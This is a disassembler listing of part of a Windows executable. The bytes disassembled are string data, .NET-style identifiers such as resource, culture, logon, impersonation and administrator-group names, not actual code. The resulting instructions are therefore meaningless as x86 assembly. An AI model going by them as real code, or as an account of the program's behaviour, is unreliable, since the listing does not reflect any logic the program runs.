  405daa:	inc    ecx
  405dab:	dec    ebp
  405dac:	push   ebx
  405dad:	add    BYTE PTR [ebp+0x58],al
  405db0:	inc    ebx
  405db1:	inc    ebp
  405db2:	push   eax
  405db3:	dec    ecx
  405db4:	dec    esi
  405db5:	inc    esi
  405db6:	dec    edi
  405db7:	add    BYTE PTR [ecx+0x6e],cl
  405dba:	jbe    0x405e2b
  405dbc:	imul   esp,DWORD PTR [ebp+0x0],0x53
  405dc0:	jns    0x405e35
  405dc2:	je     0x405e29
  405dc4:	ins    DWORD PTR es:[edi],dx
  405dc5:	cs push edx
  405dc7:	gs jae 0x405e39
  405dca:	jne    0x405e3e
  405dcc:	arpl   WORD PTR [ebp+0x73],sp
  405dcf:	add    BYTE PTR [edx+0x65],dl
  405dd2:	jae    0x405e43
  405dd4:	jne    0x405e48
  405dd6:	arpl   WORD PTR [ebp+0x4d],sp
  405dd9:	popa   
  405dda:	outs   dx,BYTE PTR ds:[esi]
  405ddb:	popa   
  405ddc:	addr16 gs jb 0x405de0
  405de0:	jb     0x405e47
  405de2:	jae    0x405e53
  405de4:	jne    0x405e58
  405de6:	arpl   WORD PTR [ebp+0x4d],sp
  405de9:	popa   
  405dea:	outs   dx,BYTE PTR ds:[esi]
  405deb:	add    BYTE PTR [ebx+0x79],dl
  405dee:	jae    0x405e64
  405df0:	gs ins DWORD PTR es:[edi],dx
  405df2:	cs inc edi
  405df4:	ins    BYTE PTR es:[edi],dx
  405df5:	outs   dx,DWORD PTR ds:[esi]
  405df6:	bound  esp,QWORD PTR [ecx+0x6c]
  405df9:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  405e00:	add    BYTE PTR [ebx+0x75],al
  405e03:	ins    BYTE PTR es:[edi],dx
  405e04:	je     0x405e7b
  405e06:	jb     0x405e6d
  405e08:	dec    ecx
  405e09:	outs   dx,BYTE PTR ds:[esi]
  405e0a:	outs   dx,WORD PTR ds:[esi]
  405e0c:	add    BYTE PTR [edx+0x65],dh
  405e0f:	jae    0x405e80
  405e11:	jne    0x405e85
  405e13:	arpl   WORD PTR [ebp+0x43],sp
  405e16:	jne    0x405e84
  405e18:	je     0x405e8f
  405e1a:	jb     0x405e81
  405e1c:	add    BYTE PTR [edi+0x65],ah
  405e1f:	je     0x405e80
  405e21:	push   edx
  405e22:	gs jae 0x405e94
  405e25:	jne    0x405e99
  405e27:	arpl   WORD PTR [ebp+0x4d],sp
  405e2a:	popa   
  405e2b:	outs   dx,BYTE PTR ds:[esi]
  405e2c:	popa   
  405e2d:	addr16 gs jb 0x405e31
  405e31:	addr16 gs je 0x405e94
  405e35:	inc    ebx
  405e36:	jne    0x405ea4
  405e38:	je     0x405eaf
  405e3a:	jb     0x405ea1
  405e3c:	add    BYTE PTR [ebx+0x65],dh
  405e3f:	je     0x405ea0
  405e41:	inc    ebx
  405e42:	jne    0x405eb0
  405e44:	je     0x405ebb
  405e46:	jb     0x405ead
  405e48:	add    BYTE PTR [edi+0x65],ah
  405e4b:	je     0x405eac
  405e4d:	inc    ebx
  405e4e:	outs   dx,DWORD PTR ds:[esi]
  405e4f:	ins    DWORD PTR es:[edi],dx
  405e50:	ins    DWORD PTR es:[edi],dx
  405e51:	popa   
  405e52:	outs   dx,BYTE PTR ds:[esi]
  405e53:	fs inc ebx
  405e55:	outs   dx,DWORD PTR ds:[esi]
  405e56:	ins    DWORD PTR es:[edi],dx
  405e57:	jo     0x405ec5
  405e59:	gs je  0x405ec1
  405e5c:	add    BYTE PTR fs:[edi+0x65],ah
  405e60:	je     0x405ec1
  405e62:	inc    ebx
  405e63:	outs   dx,DWORD PTR ds:[esi]
  405e64:	ins    DWORD PTR es:[edi],dx
  405e65:	ins    DWORD PTR es:[edi],dx
  405e66:	popa   
  405e67:	outs   dx,BYTE PTR ds:[esi]
  405e68:	fs dec esp
  405e6a:	imul   ebp,DWORD PTR [esi+0x65],0x706c6548
  405e71:	add    BYTE PTR [edi+0x65],ah
  405e74:	je     0x405ed5
  405e76:	inc    ebx
  405e77:	outs   dx,DWORD PTR ds:[esi]
  405e78:	ins    DWORD PTR es:[edi],dx
  405e79:	ins    DWORD PTR es:[edi],dx
  405e7a:	popa   
  405e7b:	outs   dx,BYTE PTR ds:[esi]
  405e7c:	fs push eax
  405e7e:	jb     0x405eef
  405e80:	arpl   WORD PTR [ebp+0x73],sp
  405e83:	jae    0x405eee
  405e85:	outs   dx,BYTE PTR ds:[esi]
  405e86:	addr16 inc esi
  405e88:	popa   
  405e89:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x74656700
  405e91:	pop    edi
  405e92:	inc    esp
  405e93:	outs   dx,BYTE PTR ds:[esi]
  405e94:	jae    0x405ee4
  405e96:	popa   
  405e97:	ins    DWORD PTR es:[edi],dx
  405e98:	gs jae 0x405ee9
  405e9b:	outs   dx,DWORD PTR ds:[esi]
  405e9c:	je     0x405ef1
  405e9e:	jne    0x405f10
  405ea0:	jo     0x405f11
  405ea2:	jb     0x405f18
  405ea4:	gs add BYTE PTR fs:[edi+0x65],ah
  405ea9:	je     0x405f0a
  405eab:	inc    ebp
  405eac:	jb     0x405f20
  405eae:	outs   dx,DWORD PTR ds:[esi]
  405eaf:	jb     0x405f03
  405eb1:	gs jno 0x405f29
  405eb4:	imul   esi,DWORD PTR [edx+0x65],0x656c4573
  405ebb:	jbe    0x405f1e
  405ebd:	je     0x405f28
  405ebf:	outs   dx,DWORD PTR ds:[esi]
  405ec0:	outs   dx,BYTE PTR ds:[esi]
  405ec1:	add    BYTE PTR [edi+0x65],ah
  405ec4:	je     0x405f25
  405ec6:	dec    ecx
  405ec7:	outs   dx,BYTE PTR ds:[esi]
  405ec8:	jbe    0x405f2b
  405eca:	ins    BYTE PTR es:[edi],dx
  405ecb:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  405ed3:	add    BYTE PTR fs:[edi+0x65],ah
  405ed7:	je     0x405f38
  405ed9:	push   eax
  405eda:	popa   
  405edb:	jb     0x405f3e
  405edd:	ins    DWORD PTR es:[edi],dx
  405ede:	gs je  0x405f46
  405ee1:	jb     0x405f38
  405ee3:	outs   dx,BYTE PTR ds:[esi]
  405ee4:	jb     0x405f4b
  405ee6:	arpl   WORD PTR [edi+0x67],bp
  405ee9:	outs   dx,BYTE PTR ds:[esi]
  405eea:	imul   edi,DWORD PTR [edx+0x65],0x65670064
  405ef1:	je     0x405f52
  405ef3:	push   eax
  405ef4:	popa   
  405ef5:	jb     0x405f58
  405ef7:	ins    DWORD PTR es:[edi],dx
  405ef8:	gs je  0x405f60
  405efb:	jb     0x405f53
  405efd:	popa   
  405efe:	ins    BYTE PTR es:[edi],dx
  405eff:	jne    0x405f66
  405f01:	inc    ebp
  405f02:	js     0x405f74
  405f04:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  405f09:	add    BYTE PTR [edi+0x65],ah
  405f0c:	je     0x405f6d
  405f0e:	push   eax
  405f0f:	popa   
  405f10:	jb     0x405f73
  405f12:	ins    DWORD PTR es:[edi],dx
  405f13:	gs je  0x405f7b
  405f16:	jb     0x405f6e
  405f18:	popa   
  405f19:	ins    BYTE PTR es:[edi],dx
  405f1a:	jne    0x405f81
  405f1c:	push   ebp
  405f1d:	outs   dx,BYTE PTR ds:[esi]
  405f1e:	gs js  0x405f91
  405f21:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  405f26:	add    BYTE PTR [edi+0x65],ah
  405f29:	je     0x405f8a
  405f2b:	push   ebx
  405f2c:	jne    0x405f95
  405f2e:	addr16 gs jae 0x405fa6
  405f32:	dec    ebp
  405f33:	outs   dx,DWORD PTR ds:[esi]
  405f34:	jb     0x405f9b
  405f36:	inc    esp
  405f37:	gs je  0x405f9b
  405f3a:	imul   ebp,DWORD PTR [ebx+esi*2+0x0],0x746c7543
  405f42:	jne    0x405fb6
  405f44:	add    BYTE PTR gs:[ebx+0x6f],al
  405f48:	ins    DWORD PTR es:[edi],dx
  405f49:	ins    DWORD PTR es:[edi],dx
  405f4a:	popa   
  405f4b:	outs   dx,BYTE PTR ds:[esi]
  405f4c:	fs inc ebx
  405f4e:	outs   dx,DWORD PTR ds:[esi]
  405f4f:	ins    DWORD PTR es:[edi],dx
  405f50:	jo     0x405fbe
  405f52:	gs je  0x405fba
  405f55:	add    BYTE PTR fs:[ebx+0x6f],al
  405f59:	ins    DWORD PTR es:[edi],dx
  405f5a:	ins    DWORD PTR es:[edi],dx
  405f5b:	popa   
  405f5c:	outs   dx,BYTE PTR ds:[esi]
  405f5d:	fs dec esp
  405f5f:	imul   ebp,DWORD PTR [esi+0x65],0x706c6548
  405f66:	add    BYTE PTR [ebx+0x6f],al
  405f69:	ins    DWORD PTR es:[edi],dx
  405f6a:	ins    DWORD PTR es:[edi],dx
  405f6b:	popa   
  405f6c:	outs   dx,BYTE PTR ds:[esi]
  405f6d:	fs push eax
  405f6f:	jb     0x405fe0
  405f71:	arpl   WORD PTR [ebp+0x73],sp
  405f74:	jae    0x405fdf
  405f76:	outs   dx,BYTE PTR ds:[esi]
  405f77:	addr16 inc esi
  405f79:	popa   
  405f7a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x736e4400
  405f82:	dec    esi
  405f83:	popa   
  405f84:	ins    DWORD PTR es:[edi],dx
  405f85:	gs jae 0x405fd6
  405f88:	outs   dx,DWORD PTR ds:[esi]
  405f89:	je     0x405fde
  405f8b:	jne    0x405ffd
  405f8d:	jo     0x405ffe
  405f8f:	jb     0x406005
  405f91:	gs add BYTE PTR fs:[ebp+0x72],al
  405f96:	jb     0x406007
  405f98:	jb     0x405fec
  405f9a:	gs jno 0x406012
  405f9d:	imul   esi,DWORD PTR [edx+0x65],0x656c4573
  405fa4:	jbe    0x406007
  405fa6:	je     0x406011
  405fa8:	outs   dx,DWORD PTR ds:[esi]
  405fa9:	outs   dx,BYTE PTR ds:[esi]
  405faa:	add    BYTE PTR [ecx+0x6e],cl
  405fad:	jbe    0x406010
  405faf:	ins    BYTE PTR es:[edi],dx
  405fb0:	imul   esp,DWORD PTR [ebx+eax*2+0x6f],0x6e616d6d
  405fb8:	add    BYTE PTR fs:[eax+0x61],dl
  405fbc:	jb     0x40601f
  405fbe:	ins    DWORD PTR es:[edi],dx
  405fbf:	gs je  0x406027
  405fc2:	jb     0x406019
  405fc4:	outs   dx,BYTE PTR ds:[esi]
  405fc5:	jb     0x40602c
  405fc7:	arpl   WORD PTR [edi+0x67],bp
  405fca:	outs   dx,BYTE PTR ds:[esi]
  405fcb:	imul   edi,DWORD PTR [edx+0x65],0x61500064
  405fd2:	jb     0x406035
  405fd4:	ins    DWORD PTR es:[edi],dx
  405fd5:	gs je  0x40603d
  405fd8:	jb     0x406030
  405fda:	popa   
  405fdb:	ins    BYTE PTR es:[edi],dx
  405fdc:	jne    0x406043
  405fde:	inc    ebp
  405fdf:	js     0x406051
  405fe1:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  405fe6:	add    BYTE PTR [eax+0x61],dl
  405fe9:	jb     0x40604c
  405feb:	ins    DWORD PTR es:[edi],dx
  405fec:	gs je  0x406054
  405fef:	jb     0x406047
  405ff1:	popa   
  405ff2:	ins    BYTE PTR es:[edi],dx
  405ff3:	jne    0x40605a
  405ff5:	push   ebp
  405ff6:	outs   dx,BYTE PTR ds:[esi]
  405ff7:	gs js  0x40606a
  405ffa:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  405fff:	add    BYTE PTR [ebx+0x75],dl
  406002:	addr16 addr16 gs jae 0x40607b
  406007:	dec    ebp
  406008:	outs   dx,DWORD PTR ds:[esi]
  406009:	jb     0x406070
  40600b:	inc    esp
  40600c:	gs je  0x406070
  40600f:	imul   ebp,DWORD PTR [ebx+esi*2+0x0],0x5f746567
  406017:	inc    ebp
  406018:	ins    DWORD PTR es:[edi],dx
  406019:	jo     0x40608f
  40601b:	jns    0x40601d
  40601d:	inc    ebx
  40601e:	outs   dx,DWORD PTR ds:[esi]
  40601f:	jo     0x40609a
  406021:	add    BYTE PTR [ebp+0x61],cl
  406024:	jb     0x406099
  406026:	push   0x74536c61
  40602b:	jb     0x4060a2
  40602d:	arpl   WORD PTR [ebp+esi*2+0x72],si
  406031:	add    BYTE PTR gs:[ebp+0x61],cl
  406035:	jb     0x4060aa
  406037:	push   0x6f546c61
  40603c:	push   ebx
  40603d:	je     0x4060b1
  40603f:	jne    0x4060a4
  406041:	je     0x4060b8
  406043:	jb     0x4060aa
  406045:	add    BYTE PTR [eax+eax*1+0x52],dl
  406049:	gs ins BYTE PTR es:[edi],dx
  40604b:	gs popa 
  40604d:	jae    0x4060b4
  40604f:	dec    eax
  406050:	popa   
  406051:	outs   dx,BYTE PTR ds:[esi]
  406052:	fs ins BYTE PTR es:[edi],dx
  406054:	add    BYTE PTR gs:[ebp+0x6d],al
  406058:	jo     0x4060ce
  40605a:	jns    0x40605c
  40605c:	addr16 gs je 0x4060bf
  406060:	dec    eax
  406061:	popa   
  406062:	outs   dx,BYTE PTR ds:[esi]
  406063:	fs ins BYTE PTR es:[edi],dx
  406065:	add    BYTE PTR gs:[ebx+0x6c],al
  406069:	outs   dx,DWORD PTR ds:[esi]
  40606a:	jae    0x4060d1
  40606c:	dec    eax
  40606d:	popa   
  40606e:	outs   dx,BYTE PTR ds:[esi]
  40606f:	fs ins BYTE PTR es:[edi],dx
  406071:	add    BYTE PTR gs:[eax+0x61],cl
  406075:	outs   dx,BYTE PTR ds:[esi]
  406076:	fs ins BYTE PTR es:[edi],dx
  406078:	add    BYTE PTR gs:[edi+ecx*2+0x47],cl
  40607d:	dec    edi
  40607e:	dec    esi
  40607f:	xor    esi,DWORD PTR [edx]
  406081:	pop    edi
  406082:	push   eax
  406083:	push   edx
  406084:	dec    edi
  406085:	push   esi
  406086:	dec    ecx
  406087:	inc    esp
  406088:	inc    ebp
  406089:	push   edx
  40608a:	pop    edi
  40608b:	inc    esp
  40608c:	inc    ebp
  40608d:	inc    esi
  40608e:	inc    ecx
  40608f:	push   ebp
  406090:	dec    esp
  406091:	push   esp
  406092:	add    BYTE PTR [edi+ecx*2+0x47],cl
  406096:	dec    edi
  406097:	dec    esi
  406098:	xor    esi,DWORD PTR [edx]
  40609a:	pop    edi
  40609b:	dec    esp
  40609c:	dec    edi
  40609d:	inc    edi
  40609e:	dec    edi
  40609f:	dec    esi
  4060a0:	pop    edi
  4060a1:	dec    esi
  4060a2:	inc    ebp
  4060a3:	push   esp
  4060a4:	push   edi
  4060a5:	dec    edi
  4060a6:	push   edx
  4060a7:	dec    ebx
  4060a8:	add    BYTE PTR [edi+ecx*2+0x47],cl
  4060ac:	dec    edi
  4060ad:	dec    esi
  4060ae:	xor    esi,DWORD PTR [edx]
  4060b0:	pop    edi
  4060b1:	dec    esp
  4060b2:	dec    edi
  4060b3:	inc    edi
  4060b4:	dec    edi
  4060b5:	dec    esi
  4060b6:	pop    edi
  4060b7:	dec    esi
  4060b8:	inc    ebp
  4060b9:	push   esp
  4060ba:	push   edi
  4060bb:	dec    edi
  4060bc:	push   edx
  4060bd:	dec    ebx
  4060be:	pop    edi
  4060bf:	inc    ebx
  4060c0:	dec    esp
  4060c1:	inc    ebp
  4060c2:	inc    ecx
  4060c3:	push   edx
  4060c4:	push   esp
  4060c5:	inc    ebp
  4060c6:	pop    eax
  4060c7:	push   esp
  4060c8:	add    BYTE PTR [ebp+0x46],dl
  4060cb:	pop    edi
  4060cc:	inc    esp
  4060cd:	dec    edi
  4060ce:	dec    esi
  4060cf:	push   esp
  4060d0:	pop    edi
  4060d1:	inc    ebp
  4060d2:	pop    eax
  4060d3:	push   eax
  4060d4:	dec    ecx
  4060d5:	push   edx
  4060d6:	inc    ebp
  4060d7:	pop    edi
  4060d8:	push   eax
  4060d9:	inc    ecx
  4060da:	push   ebx
  4060db:	push   ebx
  4060dc:	push   edi
  4060dd:	inc    esp
  4060de:	add    BYTE PTR [esi+0x45],cl
  4060e1:	push   esp
  4060e2:	pop    edi
  4060e3:	push   esi
  4060e4:	inc    ecx
  4060e5:	dec    esp
  4060e6:	dec    ecx
  4060e7:	inc    esp
  4060e8:	inc    ecx
  4060e9:	push   esp
  4060ea:	inc    ebp
  4060eb:	pop    edi
  4060ec:	push   eax
  4060ed:	inc    ecx
  4060ee:	push   ebx
  4060ef:	push   ebx
  4060f0:	push   edi
  4060f1:	dec    edi
  4060f2:	push   edx
  4060f3:	inc    esp
  4060f4:	pop    edi
  4060f5:	dec    esp
  4060f6:	inc    ecx
  4060f7:	push   ebx
  4060f8:	push   esp
  4060f9:	pop    edi
  4060fa:	push   ebx
  4060fb:	inc    ebp
  4060fc:	push   esp
  4060fd:	add    BYTE PTR [esi+0x45],cl
  406100:	push   esp
  406101:	pop    edi
  406102:	push   esi
  406103:	inc    ecx
  406104:	dec    esp
  406105:	dec    ecx
  406106:	inc    esp
  406107:	inc    ecx
  406108:	push   esp
  406109:	inc    ebp
  40610a:	pop    edi
  40610b:	inc    edx
  40610c:	inc    ecx
  40610d:	inc    esp
  40610e:	pop    edi
  40610f:	push   eax
  406110:	inc    ecx
  406111:	push   ebx
  406112:	push   ebx
  406113:	push   edi
  406114:	dec    edi
  406115:	push   edx
  406116:	inc    esp
  406117:	pop    edi
  406118:	push   esp
  406119:	dec    ecx
  40611a:	dec    ebp
  40611b:	inc    ebp
  40611c:	add    BYTE PTR [esi+0x45],cl
  40611f:	push   esp
  406120:	pop    edi
  406121:	push   esi
  406122:	inc    ecx
  406123:	dec    esp
  406124:	dec    ecx
  406125:	inc    esp
  406126:	inc    ecx
  406127:	push   esp
  406128:	inc    ebp
  406129:	pop    edi
  40612a:	dec    esp
  40612b:	dec    edi
  40612c:	inc    ebx
  40612d:	dec    ebx
  40612e:	dec    edi
  40612f:	push   ebp
  406130:	push   esp
  406131:	pop    edi
  406132:	push   esp
  406133:	dec    ecx
  406134:	dec    ebp
  406135:	inc    ebp
  406136:	add    BYTE PTR [esi+0x45],cl
  406139:	push   esp
  40613a:	pop    edi
  40613b:	push   esi
  40613c:	inc    ecx
  40613d:	dec    esp
  40613e:	dec    ecx
  40613f:	inc    esp
  406140:	inc    ecx
  406141:	push   esp
  406142:	inc    ebp
  406143:	pop    edi
  406144:	inc    edx
  406145:	inc    ecx
  406146:	inc    esp
  406147:	pop    edi
  406148:	push   eax
  406149:	inc    ecx
  40614a:	push   ebx
  40614b:	push   ebx
  40614c:	push   edi
  40614d:	dec    edi
  40614e:	push   edx
  40614f:	inc    esp
  406150:	pop    edi
  406151:	inc    ebx
  406152:	dec    edi
  406153:	push   ebp
  406154:	dec    esi
  406155:	push   esp
  406156:	add    BYTE PTR [esi+0x45],cl
  406159:	push   esp
  40615a:	pop    edi
  40615b:	push   esi
  40615c:	inc    ecx
  40615d:	dec    esp
  40615e:	dec    ecx
  40615f:	inc    esp
  406160:	inc    ecx
  406161:	push   esp
  406162:	inc    ebp
  406163:	pop    edi
  406164:	push   eax
  406165:	inc    ecx
  406166:	push   ebx
  406167:	push   ebx
  406168:	push   edi
  406169:	dec    edi
  40616a:	push   edx
  40616b:	inc    esp
  40616c:	pop    edi
  40616d:	dec    eax
  40616e:	dec    ecx
  40616f:	push   ebx
  406170:	push   esp
  406171:	dec    edi
  406172:	push   edx
  406173:	pop    ecx
  406174:	pop    edi
  406175:	dec    esp
  406176:	inc    ebp
  406177:	dec    esi
  406178:	inc    edi
  406179:	push   esp
  40617a:	dec    eax
  40617b:	add    BYTE PTR [esi+0x45],cl
  40617e:	push   esp
  40617f:	pop    edi
  406180:	push   esi
  406181:	inc    ecx
  406182:	dec    esp
  406183:	dec    ecx
  406184:	inc    esp
  406185:	inc    ecx
  406186:	push   esp
  406187:	inc    ebp
  406188:	pop    edi
  406189:	push   eax
  40618a:	inc    ecx
  40618b:	push   ebx
  40618c:	push   ebx
  40618d:	push   edi
  40618e:	dec    edi
  40618f:	push   edx
  406190:	inc    esp
  406191:	pop    edi
  406192:	dec    eax
  406193:	dec    ecx
  406194:	push   ebx
  406195:	push   esp
  406196:	dec    edi
  406197:	push   edx
  406198:	pop    ecx
  406199:	add    BYTE PTR [esi+0x45],cl
  40619c:	push   edx
  40619d:	push   edx
  40619e:	pop    edi
  40619f:	push   eax
  4061a0:	popa   
  4061a1:	jae    0x406216
  4061a3:	ja     0x406214
  4061a5:	jb     0x40620b
  4061a7:	push   esp
  4061a8:	outs   dx,DWORD PTR ds:[esi]
  4061a9:	outs   dx,DWORD PTR ds:[esi]
  4061aa:	push   ebx
  4061ab:	push   0x74726f
  4061b0:	dec    esi
  4061b1:	inc    ebp
  4061b2:	push   edx
  4061b3:	push   edx
  4061b4:	pop    edi
  4061b5:	push   eax
  4061b6:	popa   
  4061b7:	jae    0x40622c
  4061b9:	ja     0x40622a
  4061bb:	jb     0x406221
  4061bd:	push   esp
  4061be:	outs   dx,DWORD PTR ds:[esi]
  4061bf:	outs   dx,DWORD PTR ds:[esi]
  4061c0:	dec    esp
  4061c1:	outs   dx,DWORD PTR ds:[esi]
  4061c2:	outs   dx,BYTE PTR ds:[esi]
  4061c3:	add    BYTE PTR [bp+0x45],cl
  4061c7:	push   edx
  4061c8:	push   edx
  4061c9:	pop    edi
  4061ca:	push   eax
  4061cb:	popa   
  4061cc:	jae    0x406241
  4061ce:	ja     0x40623f
  4061d0:	jb     0x406236
  4061d2:	dec    esi
  4061d3:	outs   dx,DWORD PTR ds:[esi]
  4061d4:	je     0x406219
  4061d6:	outs   dx,DWORD PTR ds:[esi]
  4061d7:	ins    DWORD PTR es:[edi],dx
  4061d8:	jo     0x406246
  4061da:	gs js  0x406222
  4061dd:	outs   dx,BYTE PTR ds:[esi]
  4061de:	outs   dx,DWORD PTR ds:[esi]
  4061df:	jne    0x406248
  4061e1:	push   0x52454e00
  4061e6:	push   edx
  4061e7:	pop    edi
  4061e8:	push   eax
  4061e9:	popa   
  4061ea:	jae    0x40625f
  4061ec:	ja     0x40625d
  4061ee:	jb     0x406254
  4061f0:	inc    esi
  4061f1:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x72724572
  4061f9:	outs   dx,DWORD PTR ds:[esi]
  4061fa:	jb     0x4061fc
  4061fc:	push   ebx
  4061fd:	inc    ebp
  4061fe:	inc    ebx
  4061ff:	push   ebp
  406200:	push   edx
  406201:	dec    ecx
  406202:	push   esp
  406203:	pop    ecx
  406204:	pop    edi
  406205:	inc    edx
  406206:	push   ebp
  406207:	dec    ecx
  406208:	dec    esp
  406209:	push   esp
  40620a:	dec    ecx
  40620b:	dec    esi
  40620c:	pop    edi
  40620d:	inc    esp
  40620e:	dec    edi
  40620f:	dec    ebp
  406210:	inc    ecx
  406211:	dec    ecx
  406212:	dec    esi
  406213:	pop    edi
  406214:	push   edx
  406215:	dec    ecx
  406216:	inc    esp
  406217:	add    BYTE PTR [edi+ecx*2+0x4d],al
  40621b:	inc    ecx
  40621c:	dec    ecx
  40621d:	dec    esi
  40621e:	pop    edi
  40621f:	inc    ecx
  406220:	dec    esp
  406221:	dec    ecx
  406222:	inc    ecx
  406223:	push   ebx
  406224:	pop    edi
  406225:	push   edx
  406226:	dec    ecx
  406227:	inc    esp
  406228:	pop    edi
  406229:	inc    ecx
  40622a:	inc    esp
  40622b:	dec    ebp
  40622c:	dec    ecx
  40622d:	dec    esi
  40622e:	push   ebx
  40622f:	add    BYTE PTR [ebx+0x45],dl
  406232:	inc    ebx
  406233:	push   ebp
  406234:	push   edx
  406235:	dec    ecx
  406236:	push   esp
  406237:	pop    ecx
  406238:	pop    edi
  406239:	dec    ecx
  40623a:	dec    ebp
  40623b:	push   eax
  40623c:	inc    ebp
  40623d:	push   edx
  40623e:	push   ebx
  40623f:	dec    edi
  406240:	dec    esi
  406241:	inc    ecx
  406242:	push   esp
  406243:	dec    ecx
  406244:	dec    edi
  406245:	dec    esi
  406246:	pop    edi
  406247:	dec    esp
  406248:	inc    ebp
  406249:	push   esi
  40624a:	inc    ebp
  40624b:	dec    esp
  40624c:	add    BYTE PTR [edi+0x65],al
  40624f:	je     0x406294
  406251:	jne    0x4062c5
  406253:	jb     0x4062ba
  406255:	outs   dx,BYTE PTR ds:[esi]
  406256:	je     0x4062a1
  406258:	fs outs dx,BYTE PTR gs:[esi]
  40625b:	je     0x4062c6
  40625d:	je     0x4062d8
  40625f:	add    BYTE PTR [ecx+0x73],cl
  406262:	push   eax
  406263:	popa   
  406264:	jae    0x4062d9
  406266:	ja     0x4062d7
  406268:	jb     0x4062ce
  40626a:	push   ebx
  40626b:	je     0x4062df
  40626d:	outs   dx,DWORD PTR ds:[esi]
  40626e:	outs   dx,BYTE PTR ds:[esi]
  40626f:	addr16 inc ebp
  406271:	outs   dx,BYTE PTR ds:[esi]
  406272:	outs   dx,DWORD PTR ds:[esi]
  406273:	jne    0x4062dc
  406275:	push   0x65684300
  40627a:	arpl   WORD PTR [ebx+0x55],bp
  40627d:	jae    0x4062e4
  40627f:	jb     0x4062ef
  406281:	popa   
  406282:	ins    DWORD PTR es:[edi],dx
  406283:	add    BYTE PTR gs:[ecx+0x73],cl
  406287:	dec    esp
  406288:	outs   dx,DWORD PTR ds:[esi]
  406289:	arpl   WORD PTR [ecx+0x6c],sp
  40628c:	inc    ebx
  40628d:	outs   dx,DWORD PTR ds:[esi]
  40628e:	ins    DWORD PTR es:[edi],dx
  40628f:	jo     0x406306
  406291:	je     0x4062f8
  406293:	jb     0x406295
  406295:	inc    ebx
  406296:	push   0x556b6365
  40629b:	jae    0x406302
  40629d:	jb     0x40630d
  40629f:	popa   
  4062a0:	ins    DWORD PTR es:[edi],dx
  4062a1:	gs push eax
  4062a3:	popa   
  4062a4:	jae    0x406319
  4062a6:	ja     0x406317
  4062a8:	jb     0x40630e
  4062aa:	add    BYTE PTR [edi+0x65],al
  4062ad:	je     0x4062f7
  4062af:	popa   
  4062b0:	jae    0x4062f6
  4062b2:	outs   dx,DWORD PTR ds:[esi]
  4062b3:	ins    DWORD PTR es:[edi],dx
  4062b4:	popa   
  4062b5:	imul   ebp,DWORD PTR [esi+0x0],0x74737953
  4062bc:	gs ins DWORD PTR es:[edi],dx
  4062be:	cs push ebx
  4062c0:	arpl   WORD PTR gs:[ebp+0x72],si
  4062c4:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6e697250
  4062cc:	arpl   WORD PTR [ecx+0x70],bp
  4062cf:	popa   
  4062d0:	ins    BYTE PTR es:[edi],dx
  4062d1:	add    BYTE PTR [edi+0x69],dl
  4062d4:	outs   dx,BYTE PTR ds:[esi]
  4062d5:	outs   dx,DWORD PTR fs:[esi]
  4062d7:	ja     0x40634c
  4062d9:	dec    ecx
  4062da:	ins    DWORD PTR es:[edi],dx
  4062db:	jo     0x406342
  4062dd:	jb     0x406352
  4062df:	outs   dx,DWORD PTR ds:[esi]
  4062e0:	outs   dx,BYTE PTR ds:[esi]
  4062e1:	popa   
  4062e2:	je     0x40634d
  4062e4:	outs   dx,DWORD PTR ds:[esi]
  4062e5:	outs   dx,BYTE PTR ds:[esi]
  4062e6:	inc    ebx
  4062e7:	outs   dx,DWORD PTR ds:[esi]
  4062e8:	outs   dx,BYTE PTR ds:[esi]
  4062e9:	je     0x406350
  4062eb:	js     0x406361
  4062ed:	add    BYTE PTR [ecx+0x6d],cl
  4062f0:	jo     0x406357
  4062f2:	jb     0x406367
  4062f4:	outs   dx,DWORD PTR ds:[esi]
  4062f5:	outs   dx,BYTE PTR ds:[esi]
  4062f6:	popa   
  4062f7:	je     0x40635e
  4062f9:	add    BYTE PTR [ebx+0x68],al
  4062fc:	arpl   WORD PTR gs:[ebx+0x55],bp
  406300:	jae    0x406367
  406302:	jb     0x406345
  406304:	arpl   WORD PTR [ebx+0x65],sp
  406307:	jae    0x40637c
  406309:	push   esp
  40630a:	outs   dx,DWORD PTR ds:[esi]
  40630b:	inc    esp
  40630c:	imul   esi,DWORD PTR [edx+0x0],0x55746547
  406313:	jae    0x40637a
  406315:	jb     0x40636b
  406317:	outs   dx,DWORD PTR ds:[esi]
  406318:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40631c:	push   ebp
  40631d:	jae    0x406384
  40631f:	jb     0x406366
  406321:	js     0x40638c
  406323:	jae    0x406399
  406325:	jae    0x406327
  406327:	inc    edi
  406328:	gs je  0x406379
  40632b:	outs   dx,DWORD PTR ds:[esi]
  40632c:	jb     0x40639b
  40632e:	popa   
  40632f:	ins    BYTE PTR es:[edi],dx
  406330:	imul   edi,DWORD PTR [edx+0x65],0x6d614e64
  406337:	add    BYTE PTR gs:[edi+0x69],dl
  40633b:	outs   dx,BYTE PTR ds:[esi]
  40633c:	outs   dx,DWORD PTR fs:[esi]
  40633e:	ja     0x4063b3
  406340:	push   eax
  406341:	jb     0x4063ac
  406343:	outs   dx,BYTE PTR ds:[esi]
  406344:	arpl   WORD PTR [ecx+0x70],bp
  406347:	popa   
  406348:	ins    BYTE PTR es:[edi],dx
  406349:	add    BYTE PTR [ecx+0x73],cl
  40634c:	dec    ecx
  40634d:	outs   dx,BYTE PTR ds:[esi]
  40634e:	inc    ecx
  40634f:	fs ins DWORD PTR es:[edi],dx
  406351:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  406358:	je     0x4063c9
  40635a:	jb     0x4063cf
  40635c:	inc    edi
  40635d:	jb     0x4063ce
  40635f:	jne    0x4063d1
  406361:	add    BYTE PTR [ecx+0x73],cl
  406364:	push   ebx
  406365:	je     0x4063d9
  406367:	outs   dx,DWORD PTR ds:[esi]
  406368:	outs   dx,BYTE PTR ds:[esi]
  406369:	addr16 inc ebp
  40636b:	outs   dx,BYTE PTR ds:[esi]
  40636c:	outs   dx,DWORD PTR ds:[esi]
  40636d:	jne    0x4063d6
